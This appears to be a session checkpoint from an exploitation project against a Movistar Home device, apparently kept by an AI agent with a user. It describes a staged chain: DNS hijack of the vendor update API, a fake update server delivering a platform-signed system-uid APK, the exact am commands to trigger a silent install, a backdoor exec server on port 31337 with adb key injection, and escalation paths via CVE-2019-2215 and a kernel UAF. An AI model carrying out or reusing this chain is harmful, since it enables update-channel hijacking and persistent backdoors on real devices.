# CHECKPOINT — off-kernel Troya chain: ONE FLAG AWAY (2026-10-11 ~22:58)

Status at wrap-up (user going to sleep; poller running on device, `job.sh` = idle-night).

## Where we are

The **entire off-kernel chain is built and staged**. One single command-line flag
blocked tonight's final run:

```
/system/bin/am start-foreground-service -n com.telefonica.movistarhome.updater/...PackageService
  → SecurityException: "service asks to run as user -2 but is calling from user 0"
```

**Fix (next session, first thing):** add `--user 0`:

```
AM=/system/bin/am
$AM start-foreground-service --user 0 -n com.telefonica.movistarhome.updater/com.telefonica.movistarhome.updater.data.PackageService
sleep 2
$AM broadcast -a com.telefonica.movistarhome.updater.data.action.ACTION_UPDATE_APPS
```

JOB-108 should be JOB-107 (`job.sh` at 22:52) with `--user 0` on every `$AM` call
(including the payload trigger broadcast — harmless there, but keep it consistent).

## Why this should work (all verified tonight)

- Updater flow (from decompiled smali, /tmp/ups): `/api/v1/updates/sw` →
  downloads `url` → **unzips** (old backend's bare bundle.json = why JOB-127/128
  silently failed) → parses `packages/descriptor` (moshi `BundleApp`:
  `apps[{apk,package,version_code,signature}]`, `bundle_version`) →
  `IsAppValidToUpdate` passes any non-updater package → `needsUpdate` returns
  TRUE for a NEW package (NameNotFoundException → true) → MD5 check
  (`signature` = MD5 of the apk inside the zip) → `silentInstallPackage`
  (PackageInstaller session, INSTALL_PACKAGES as system).
- **New package (com.mh.pwn) installs despite not being installed yet** — verified
  in VersionUtil.appNeedsUpdate.
- Updater = system app ⇒ `notSystemAppSupport()` never calls `startForeground()`
  ⇒ AMS kills the process ~5-10s after start-foreground-service. **That's OK:**
  once `PackageInstaller.commit()` fires, system_server completes the install
  even if the updater dies. Hence the retry loop (8 attempts) in JOB-107 — keep it.
- The old TERMUX `am` doesn't support `start-foreground-service`; use
  `/system/bin/am` (exists, root:shell, 207 bytes wrapper).

## What's staged (Mac side, all ready)

- `troya/pwn.apk` — `com.mh.pwn`, `sharedUserId="android.uid.system"`,
  **signed with platform key** (AOSP `CN=Android`, sha1 27:19:6E:...:FA).
  Payload (`troya/pwnsrc/com/mh/pwn/Pwn.java`): exported receiver
  `com.mh.pwn.PWN` (runs `--es cmd` as system uid, logs to /sdcard/mhpwn.log +
  /data/local/tmp/mhpwn.log), best-effort ADB flip + adb_keys write, and a
  persistent exec server on **:31337** (line in, output lines back, `%%EOT%%`).
  MD5 68715f5d5ae275ff1f2f6c3db5e149c9.
- `troya/packages.zip` — `descriptor` (bundle_version 999, signature=MD5 above)
  + `pwn.apk`. Server-side verified.
- `fake_troya.py` (:443, running, timestamps in `troya_backend.log`):
  `/api/v1/updates/sw` → `{"hasUpdate":true,"url":"https://api.es-pro.movistar-home.com/packages.zip"}`;
  `/packages.zip` serves the zip.
- DNS hijack for api.es-pro.movistar-home.com → <tester-host> still effective
  after reboot (verified in JOB-106 step 1).
- adb keypair for the payload at /tmp/adbkey(.pub) — embedded in Pwn.java.

## Verification once installed (no poller needed!)

From the Mac: `echo id | nc <device-ip> 31337` → expect `uid=1000(system)`.
Or poller job: `dumpsys package com.mh.pwn | grep -E "userId|seinfo|pkgFlags"`
→ userId=1000, seinfo=platform.

Then escalation options (as platform-signed system-uid app, no KASLR):
- `adb_keys` + adbd TCP (`setprop service.adb.tcp.port 5555` as system; adbd
  restart needs root though — payload logs what works), or
- run the CVE-2019-2215 arb-read as SYSTEM domain for recon, or
- kernel af_unix path is PARKED (see below) — system uid first, root after.

## af_unix (PARKED, do not resume without asking)

User confirmed the 22:24 device death **was a panic** ⇒ JOB-105 small-pre sweep
hit the UAF (pre≈0 fires the race). Everything documented in
`reports/2026-10-11-AF_UNIX-0920-GPZ-HANDOFF.md` + `...GPZ-PORT-STATUS2.md`.
Before any resumption: controlled scm_fp_list reclaim + pstore/last_kmsg check.

## Housekeeping

- `job.sh` = idle-night (safe). Poller on device is RUNNING (fetching every 15s).
- New job.sh content = one run + one POST, then silent until content changes.
- Useful decode: /tmp/ups (updater full smali), /tmp/plat28/android-9/android.jar.
- Backend log now has timestamps: `troya_backend.log`.
